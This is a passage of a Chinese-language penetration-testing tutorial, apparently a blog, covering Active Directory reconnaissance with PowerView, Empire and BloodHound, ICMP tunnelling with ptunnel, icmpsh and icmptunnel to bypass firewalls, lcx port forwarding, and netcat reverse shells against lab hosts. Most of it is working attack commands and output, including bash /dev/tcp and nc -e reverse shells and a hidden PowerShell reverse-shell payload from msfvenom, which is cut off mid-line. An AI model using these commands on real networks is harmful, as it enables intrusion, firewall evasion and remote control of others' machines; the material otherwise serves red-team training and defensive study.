有<code>Invoke-StealthUserHunter</code>命令</p></blockquote><p><strong>Invoke-StealthUserHunter</strong>：只需要进行一次查询，就可以获取域里面的所有用户。其原理为：从<code>user.HomeDirectories</code>中提取所有用户，并对每个服务器进行<code>Get-NetSession</code>获取。因不需要使用<code>Invoke-UserHunter</code>对每台机器进行操作，所以这个方法的隐蔽性相对较高（但涉及的机器不一定全面）。PowerView 默认使用<code>Invoke-StealthUserHunter</code>如果找不到需要的信息，就会使用<code>Invoke-UserHunter</code>.</p><p><strong>Invoke-UserHunter</strong>：找到域内特定的用户群，接受用户名、用户列表和域组查询，接收一个主机列表或查询可用的主机域名。使用<code>Get-NetSession</code>和<code>Get-NetLoggedon</code>(调用 NetSessionEnum 和 NetWkstaUserEnumAPI )扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，在使用时不需要管理员权限。</p><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\daniel10&gt; Invoke-UserHunterUserDomain   : TEAMSSIXUserName     : AdministratorComputerName : dc.teamssix.comIP           : 192.168.7.7SessionFrom  :LocalAdmin   :UserDomain   : TEAMSSIXUserName     : daniel10ComputerName : daniel10.teamssix.comIP           : 192.168.7.110SessionFrom  :LocalAdmin   :UserDomain   : TEAMSSIXUserName     : AdministratorComputerName : daniel7.teamssix.comIP           : 192.168.7.107SessionFrom  :LocalAdmin   :<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>PowerView 中的其他信息收集模块：</p><ul><li>Get-NetDomain:获取当前用户所在域名称</li><li>Get-NetUser：获取所有用户的详细信息</li><li>Get-NetDomainController：获取所有域控制器的信息</li><li>Get-NetComputer：获取域内所有机器的详细信息</li><li>Get-NetOU：获取域中的OU信息</li><li>Get-NetGroup：获取所有域内组和组成员信息</li><li>Get-NetFileServer：根据SPN获取当前域使用的文件服务器信息</li><li>Get-NetShare：获取当前域内所有的网络共享信息</li><li>Get-NetSession：获取指定服务器的会话</li><li>Get-NetRDPSession：获取指定服务器的远程连接</li><li>Get-NetProcess：获取远程主机的进程</li><li>Get-UserEvent：获取指定用户的日志</li><li>Get-ADObject：获取活动目录的对象</li><li>Get-NetGPO：获取域内所有组的策略对象</li><li>Get-DomainPolicy：获取域默认策略或域控制器策略</li><li>Invoke-UserHunter：获取域用户登陆的计算机信息及该用户是否有本地管理员权限</li><li>Invoke-ProcessHunter：通过查询域内所有的机器进程找到特定用户</li><li>Invoke-UserEventHunter：根据用户日志查询某域用户登陆过哪些域机器</li></ul><h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><p>Empire中的<code>user_hunter</code>模块用于查找域管理员登陆的机器，使用 powershell/situational_awareness/network/powerview/user_hunter 模块，可查看哪个用户登陆哪台主机。</p><pre class="line-numbers language-none"><code class="language-none">(Empire: listeners) &gt; agents[*] Active agents: Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen ----     -- -----------     ------------      --------                -------            ---    -----    --------- 3XRCWAB2 ps 192.168.7.7     DC                *TEAMSSIX\administrator powershell         2256   5&#x2F;0.0    2021-02-22 20:39:54(Empire: agents) &gt; usemodule powershell&#x2F;powershell&#x2F;situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter(Empire: powershell&#x2F;situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter) &gt; set Agent 3XRCWAB2(Empire: powershell&#x2F;situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter) &gt; execute[*] Tasked 3XRCWAB2 to run TASK_CMD_JOB[*] Agent 3XRCWAB2 tasked with task ID 1[*] Tasked agent 3XRCWAB2 to run module powershell&#x2F;situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter[*] Valid results returned by 192.168.7.7……<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6、查找域管理员进程"><a href="#6、查找域管理员进程" class="headerlink" title="6、查找域管理员进程"></a>6、查找域管理员进程</h2><h3 id="获取域管理员列表"><a href="#获取域管理员列表" class="headerlink" title="获取域管理员列表"></a>获取域管理员列表</h3><pre class="line-numbers language-none"><code class="language-none">net group &quot;Domain Admins&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;net group &quot;Domain Admins&quot; &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。组名     Domain Admins注释     指定的域管理员成员-------------------------------------------------------------------------------Administrator命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="列出本机的所有进程及进程用户"><a href="#列出本机的所有进程及进程用户" class="headerlink" title="列出本机的所有进程及进程用户"></a>列出本机的所有进程及进程用户</h3><pre class="line-numbers language-none"><code class="language-none">tasklist &#x2F;v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;tasklist &#x2F;v映像名称                       PID 会话名              会话#       内存使用  状态            用户名                                                 CPU 时间 窗口标题&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;System Idle Process              0 Services                   0          8 K Unknown         NT AUTHORITY\SYSTEM                                    68:35:16 暂缺System                           4 Services                   0        924 K Unknown         暂缺                                                    0:24:14 暂缺svchost.exe                   9228 Console                    2      2,932 K Unknown         TEAMSSIX\daniel10                                       0:00:00 暂缺tasklist.exe                 10768 Console                    2      9,540 K Unknown         TEAMSSIX\daniel10                                       0:00:00 暂缺……内容过多省略……<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果在列出的进程中看到了用户名为管理员用户名的话，便是找到了域管理员进程。</p><h1 id="0x05-BloodHound-的使用"><a href="#0x05-BloodHound-的使用" class="headerlink" title="0x05 BloodHound 的使用"></a>0x05 BloodHound 的使用</h1><h2 id="1、介绍-1"><a href="#1、介绍-1" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>BloodHound 使用可视化图形显示域环境中的关系，攻击者可以使用 BloodHound 识别高度复杂的攻击路径，防御者可以使用 BloodHound 来识别和防御那些相同的攻击路径。蓝队和红队都可以使用 BloodHound 轻松深入域环境中的权限关系。</p><p>BloodHound 通过在域内导出相关信息，在将数据收集后，将其导入Neo4j 数据库中，进行展示分析。因此在安装 BloodHound 时，需要安装 Neo4j 数据库。</p><h2 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h2><p>因为 Neo4j 数据库需要 Java 支持，因此安装 BloodHound 需要先安装 Java，这里以 Windows 系统下的安装为例。</p><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>JDK 需要下载最新版本，不然 Neo4j 运行可能会报错，JDK 下载地址：<a href="https://www.oracle.com/java/technologies/javase-downloads.html">https://www.oracle.com/java/technologies/javase-downloads.html</a>，下载之后，直接安装即可。</p><h3 id="Neo4j"><a href="#Neo4j" class="headerlink" title="Neo4j"></a>Neo4j</h3><p>Neo4j 直接下载最新版本，下载地址：<a href="https://neo4j.com/download-center/#community">https://neo4j.com/download-center/#community</a></p><p>下载最新版本之后解压下载文件，打开 bin 目录，执行命令<code>neo4j.bat console</code>，之后打开浏览器访问 <a href="http://localhost:7474/">http://localhost:7474</a> 登陆后台，输入以下信息连接到数据库说明安装就完成了。</p><pre class="line-numbers language-none"><code class="language-none">URL：neo4j:&#x2F;&#x2F;localhost:7687用户名(默认)：neo4j密码(默认)：neo4j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>BloodHound 项目地址：<a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a>，下载后解压打开 BloodHound.exe，输入 Neo4j 数据库的账号密码即可完成安装。</p><h2 id="3、使用"><a href="#3、使用" class="headerlink" title="3、使用"></a>3、使用</h2><p>安装完成 BloodHound 后，需要进行数据的采集与导入，数据的采集可以使用 ps1 脚本或者使用 exe 程序收集，工具下载地址：<a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors</a></p><p>这里使用 SharpHound.exe 进行数据的采集，将 SharpHound.exe 拷贝到目标上，执行 <code>SharpHound.exe -c all</code> 进行数据采集。</p><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt;SharpHound.exe -c all---------------------------------------------Initializing SharpHound at 22:36 on 2021&#x2F;2&#x2F;25---------------------------------------------Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container[+] Creating Schema map for domain TEAMSSIX.COM using path CN&#x3D;Schema,CN&#x3D;Configuration,DC&#x3D;teamssix,DC&#x3D;com[+] Cache File Found! Loaded 1332 Objects in cache[+] Pre-populating Domain Controller SIDSStatus: 0 objects finished (+0) -- Using 24 MB RAMStatus: 673 objects finished (+673 134.6)&#x2F;s -- Using 43 MB RAMEnumeration finished in 00:00:05.3136324Compressing data to .\20210225223622_BloodHound.zipYou can upload this file directly to the UISharpHound Enumeration Completed at 22:36 on 2021&#x2F;2&#x2F;25! Happy Graphing!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果使用 ps1 脚本收集，命令为：</p><pre class="line-numbers language-none"><code class="language-none">powershell -exec bypass -command &quot;Import-Module .&#x2F;SharpHound.ps1; Invoke-BloodHound -c all&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>采集到的数据会以 zip 压缩包的格式保存，将其拷贝到 BloodHound 所在主机上，在 BloodHound 右侧图标里点击 Upload Data，之后上传刚才生成的压缩包就可以导入数据了。</p><blockquote><p>或者直接将 zip 压缩包拖拽到 BloodHound 里也可以导入数据。</p></blockquote><p>在 BloodHound 右上角有三个板块：</p><p>1、Database Info（数据库信息），可以查看当前数据库中的域用户、域计算机等统计信息。</p><p>2、Node Indo（节点信息），单击某个节点时，在这里可以看到对应节点的相关信息。</p><p>3、Analysis（分析查询），在 BloodHound 中预设了一些查询条件，具体如下：</p><pre class="line-numbers language-none"><code class="language-none">1、查询所有域管理员2、寻找到域管理员的最短路径3、查找具有DCSync权限的主体4、具有外部域组成员资格的用户5、具有外部域名组成员资格的组6、映射域信任7、到无约束委托系统的最短路径8、到达Kerberoastable用户的最短路径9、从Kerberoastable用户到域管理员的最短路径10、拥有的主体的最短路径11、从拥有的主体到域管理员的最短路径12、到高价值目标的最短路径13、查找域用户是本地管理员的计算机14、查找域用户可以读取密码的计算机15、从域用户到高价值目标的最短路径16、找到从域用户到高价值目标的所有路径17、找到域用户可以RDP的工作站18、找到域用户可以RDP的服务器19、查找域用户组的危险权限20、找到高价值群体中能够支持kerberoable的成员21、列出所有kerberoable用户22、查找具有大多数特权的Kerberoastable用户23、查找到非域控制器的域管理登录24、查找不支持操作系统的计算机25、查找AS-REP Roastable用户(DontReqPreAuth)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>比如这里查询到域管理员的最短路径</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-25_14-00-42.png"></p><blockquote><p>路径由粗到细表示xx对xx有权限或关系</p></blockquote><p>总的来说感觉 BloodHound 还是挺有意思的，可以很直观的看到域内主机间的关系。不过毕竟是辅助工具，还是需要不断提升自己的实力、经验才能更好的去分析这样的一个结果才是。</p><h1 id="0x06-ICMP-隧道工具使用"><a href="#0x06-ICMP-隧道工具使用" class="headerlink" title="0x06 ICMP 隧道工具使用"></a>0x06 ICMP 隧道工具使用</h1><h2 id="1、介绍-2"><a href="#1、介绍-2" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>在内网中，如果攻击者使用 HTTP、DNS 等应用层隧道都失败了，那么或许可以试试网络层的 ICMP 隧道，ICMP 协议最常见的场景就是使用 ping 命令，而且一般防火墙都不会禁止 ping 数据包。</p><p>因此我们便可以将 TCP/UDP 数据封装到 ICMP 的 ping 数据包中，从而绕过防火墙的限制。</p><h2 id="2、建立-ICMP-隧道工具"><a href="#2、建立-ICMP-隧道工具" class="headerlink" title="2、建立 ICMP 隧道工具"></a>2、建立 ICMP 隧道工具</h2><p>用于建立 ICMP 隧道的工具常见有：ptunnel、icmpsh、icmptunnel 等</p><h3 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a>ptunnel</h3><p>ptunnel 全称 PingTunnel，Kali 下自带该工具，Linux 下安装过程如下：</p><pre class="line-numbers language-none"><code class="language-none">yum -y install byaccyum -y install flex bison#安装libpcap依赖库wget http:&#x2F;&#x2F;www.tcpdump.org&#x2F;release&#x2F;libpcap-1.9.0.tar.gztar -xzvf libpcap-1.9.0.tar.gzcd libpcap-1.9.0.&#x2F;configuremake &amp;&amp; make install#安装PingTunnelwget http:&#x2F;&#x2F;www.cs.uit.no&#x2F;~daniels&#x2F;PingTunnel&#x2F;PingTunnel-0.72.tar.gztar -xzvf PingTunnel-0.72.tar.gzcd PingTunnelmake &amp;&amp; make install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ptunnel 常用命令介绍：</p><pre class="line-numbers language-none"><code class="language-none">-p: 指定跳板服务器 IP 地址-lp: 监听本地 TCP 端口-da: 指定访问目标的内网 IP 地址-dp: 指定访问目标的端口-m: 设置隧道最大并发数-v: 输入内容详细级别（-1到4，其中-1为无输出，4为全部输出）-udp: 切换使用UDP代替ICMP，代理将监听端口53（必须是 root 权限）-x: 设置隧道密码，防止滥用（客户端和代理端必须相同）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>目前有这样的一个场景，当前已经拿下了一台外网 Web Linux 服务器，想通过它利用 ICMP 协议连接内网的一台已经开启远程桌面的 Windows ，网络结构简化如下。</p><pre class="line-numbers language-none"><code class="language-none">Kali 攻击机       172.16.214.6 (外网)||Linux Web 跳板机  172.16.214.5  (外网)|                192.168.7.5   (内网)||Win RDP 目标机    192.168.7.110 (内网)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Kali 攻击机上执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">ptunnel -p 172.16.214.5 -lp 1080 -da 192.168.7.110 -dp 3389 -x teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-p  指定跳板机外网IP-lp 指定本机的监听端口-da 指定目标机的内网IP-dp 指定目标机的端口-x 设置隧道密码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Linux Web 跳板机上执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">ptunnel -x teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后访问 Kali 攻击机 172.16.214.6 的 1080 端口就会连接到 Win RDP 目标机 192.168.7.110 的 3389 端口了，不过实测发现这种方法有些不稳定。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-04-07_14-46-46.png"></p><h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><p>icmpsh 使用很简单，直接在 github 上下载，运行时不需要管理员权限，但是在使用时需要关闭本地系统的 ICMP 应答，不然 shell 的运行会不稳定。</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;inquisb&#x2F;icmpsh.git #下载工具apt-get install python-impacket # 安装依赖，或者 pip2 install impacketsysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1  #关闭本地ICMP应答<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>icmpsh 常用命令介绍：</p><pre class="line-numbers language-none"><code class="language-none">-t host            发送ping请求的主机ip地址，即攻击机的IP [该命令必须存在]-d milliseconds    请求时间间隔（毫秒）-o milliseconds    响应超时时间（毫秒）-s bytes           最大数据缓冲区大小（字节）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>目前有这样的一个场景，攻击机能通过 ICMP 协议访问到目标主机，但是目标上有防火墙，拒绝了敏感端口比如 22、3389 端口的访问，这个时候可以使用 icmpsh 利用 ICMP 协议建立反向 shell</p><pre class="line-numbers language-none"><code class="language-none">攻击机 IP：172.16.214.6目标机 IP：172.16.214.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在攻击机上运行：</p><pre class="line-numbers language-none"><code class="language-none">python2 icmpsh_m.py 172.16.214.6 172.16.214.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在目标机上运行</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;icmpsh.exe -t 172.16.214.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时在攻击机上可以看到通过 icmp 协议建立的 shell</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-04-07_15-43-51.png"></p><h3 id="icmptunnel"><a href="#icmptunnel" class="headerlink" title="icmptunnel"></a>icmptunnel</h3><p> icmptunnel 的优势在于可以穿过状态防火墙或 NAT，同样在 github 上进行下载，值得注意的是该工具只有 Linux 版。</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;jamesbarlow&#x2F;icmptunnel.gitcd icmptunnelmake<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>目前有这样的一个场景，攻击者为 Linux，但由于目标存在状态防火墙或者使用了 NAT 导致无法获得 shell，此时可以通过 icmptunnel 绕过限制。</p><pre class="line-numbers language-none"><code class="language-none">攻击机 IP：172.16.214.6目标机 IP：172.16.214.5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在攻击机上运行：</p><pre class="line-numbers language-none"><code class="language-none">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;icmp_echo_ignore_all# 禁用 ICMP echo 回复，防止内核自己对ping包进行响应.&#x2F;icmptunnel -s# 开启服务端模式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在攻击机上新开启一个终端运行：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;sbin&#x2F;ifconfig tun0 10.0.0.1 netmask 255.255.255.0# 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在目标机上运行：</p><pre class="line-numbers language-none"><code class="language-none">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;icmp_echo_ignore_all.&#x2F;icmptunnel 172.16.214.6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在目标机上新开启一个终端运行：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;sbin&#x2F;ifconfig tun0 10.0.0.2 netmask 255.255.255.0# 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址 (10.0.0.2)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>至此，已经通过 ICMP 建立了一个点对点隧道。</p><p>在攻击机上，尝试通过 ssh 进行连接，可以看到通过刚才建立的隧道成功连接到目标机。</p><pre class="line-numbers language-none"><code class="language-none">ssh root@10.0.0.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-04-07_16-35-09.png"></p><h1 id="0x07-lcx、netcat-和-socat-的使用"><a href="#0x07-lcx、netcat-和-socat-的使用" class="headerlink" title="0x07 lcx、netcat 和 socat 的使用"></a>0x07 lcx、netcat 和 socat 的使用</h1><h2 id="1、lcx-使用"><a href="#1、lcx-使用" class="headerlink" title="1、lcx 使用"></a>1、lcx 使用</h2><p>lcx 分为 Windows 版和 Linux 版，Linux 版叫 portmap</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul><li>内网端口转发</li></ul><pre class="line-numbers language-none"><code class="language-none">内网失陷主机lcx.exe -slave rhost rport lhost lport公网代理主机lcx.exe -listen lport1 lport2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">内网失陷主机lcx.exe -slave 123.123.123.123 4444 127.0.0.1 3389公网代理主机lcx.exe -listen 4444 5555<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在建立连接后，访问公网代理主机的 5555 端口就能访问到内网失陷主机的 3389 端口了。</p><ul><li>本地端口映射</li></ul><p>如果目标主机不能出网，这时可以利用内网中能够出网的主机，将其不能出网的主机端口映射到自身上，再借助端口转发到公网进行访问。</p><pre class="line-numbers language-none"><code class="language-none">lcx.exe -tran 53 &lt;目标主机 IP 地址&gt; 3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul><li>内网端口转发</li></ul><pre class="line-numbers language-none"><code class="language-none">内网失陷主机.&#x2F;portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 &lt;公网主机 IP&gt; -p2 4444公网代理主机.&#x2F;portmap -m 2 -p1 4444 -h2 &lt;公网主机 IP&gt; -p2 5555<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时访问公网主机 IP 的 5555 端口，就会访问到内网失陷主机的 22 端口了。</p><h2 id="2、netcat-使用"><a href="#2、netcat-使用" class="headerlink" title="2、netcat 使用"></a>2、netcat 使用</h2><p>nc 下载地址：<a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p><p>nc 全称 netcat，它的功能很多，这里简单记录下两个常用的功能，其他的比如文件传输、端口扫描等等的就不介绍了，毕竟平时使用频率有一说一还是比较少的。</p><pre class="line-numbers language-none"><code class="language-none">-l 开启监听状态-v 显示详细信息-p 指定监听的本地端口-k 客户端断掉连接时，服务端依然保持运行-e 将传入的信息以命令执行-n 直接使用 IP 地址，不进行 dns 解析过程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="获取-banner-信息"><a href="#获取-banner-信息" class="headerlink" title="获取 banner 信息"></a>获取 banner 信息</h3><p>个人觉着最常用的功能，这个不仅可以用来查看 banner 信息，还能用来判断端口是否开放。</p><pre class="line-numbers language-none"><code class="language-none">nc -vv rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; nc -v 172.16.214.43 22Connection to 172.16.214.43 port 22 [tcp&#x2F;ssh] succeeded!SSH-2.0-OpenSSH_8.4p1 Debian-3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>个人觉着这个也是最常用的功能，可以使用 -e 指定 /bin/bash 进行反弹，也可以直接 -c 指定 bash 或者 cmd</p><p><strong>-e 指定反弹 shell</strong></p><pre class="line-numbers language-none"><code class="language-none"># 失陷主机nc -lvp lport -e &#x2F;bin&#x2F;bash# linux 主机nc -lvp lport -e c:\windows\system32\cmd.exe # windows 主机# 控制端nc rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"># 失陷主机&gt; nc -lvp 4444 -e &#x2F;bin&#x2F;bashlistening on [any] 4444 ...172.16.214.1: inverse host lookup failed: Unknown hostconnect to [172.16.214.43] from (UNKNOWN) [172.16.214.1] 60628# 控制端&gt; nc -v 172.16.214.43 4444Connection to 172.16.214.43 port 4444 [tcp&#x2F;krb524] succeeded!whoamiroot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>-c 指定反弹 shell</strong></p><pre class="line-numbers language-none"><code class="language-none"># 失陷主机nc -lvp lprot -c bash# linux 主机nc -lvp lport -c cmd # windows 主机# 控制端nc rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"># 失陷主机&gt; nc -lvp 4444 -c bashlistening on [any] 4444 ...172.16.214.1: inverse host lookup failed: Unknown hostconnect to [172.16.214.43] from (UNKNOWN) [172.16.214.1] 60635# 控制端&gt; nc -v 172.16.214.43 4444Connection to 172.16.214.43 port 4444 [tcp&#x2F;krb524] succeeded!whoamiroot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>结合其他语言进行反弹 shell</strong></p><pre class="line-numbers language-none"><code class="language-none"># 失陷主机bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;rhost&#x2F;rport 0&gt;&amp;1# 控制端nc -lvp lprot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"># 失陷主机&gt; bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.16.214.43&#x2F;4444 0&gt;&amp;1# 控制端&gt; nc -lp 4444root@ubuntu:~# whoamiwhoamiroot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除了 bash 也可以使用其他的语言进行反弹 shell，这里可以使用 msfvenom 生成反弹 shell，操作起来比较方便，使用 <code>msfvenom -l payload | grep &quot;cmd/&quot;</code>可查看可使用的 payload</p><p>比如使用 <code>cmd/windows/reverse_powershell</code> 这个 payload</p><pre class="line-numbers language-none"><code class="language-none"># 控制端&gt; msfvenom -p cmd&#x2F;windows&#x2F;reverse_powershell lhost&#x3D;172.16.214.43 lport&#x3D;4444[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: cmd from the payloadNo encoder specified, outputting raw payloadPayload size: 1586 bytespowershell -w hidden -nop -c $a&#x3D;&#39;172.16.214.43&#39;;$b&#x3D;4444;$c&#x3D;New-Object system.net.sockets.tcpclient;$nb&#x3D;New-Object System.Byte[] $c.ReceiveBufferSize;$ob&#x3D;New-Object System.Byte[] 65536;$eb&#x3D;New-Object System.Byte[] 65536;$e&#x3D;new-object System.Text.UTF8Encoding;$p&#x3D;New-Object System.Diagnostics.Process;$p.StartInfo.FileName&#x3D;&#39;cmd.exe&#39;;$p.StartInfo.RedirectStandardInput&#x3D;1;$p.StartInfo.RedirectStandardOutput&#x3D;1;$p.StartInfo.RedirectStandardError&#x3D;1;$p.StartInfo.UseShellExecute&#x3D;0;$q&#x3D;$p.Start();$is&#x3D;$p.StandardInput;$os&#x3D;$p.StandardOutput;$es&#x3D;$p.StandardError;$osread&#x3D;$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, 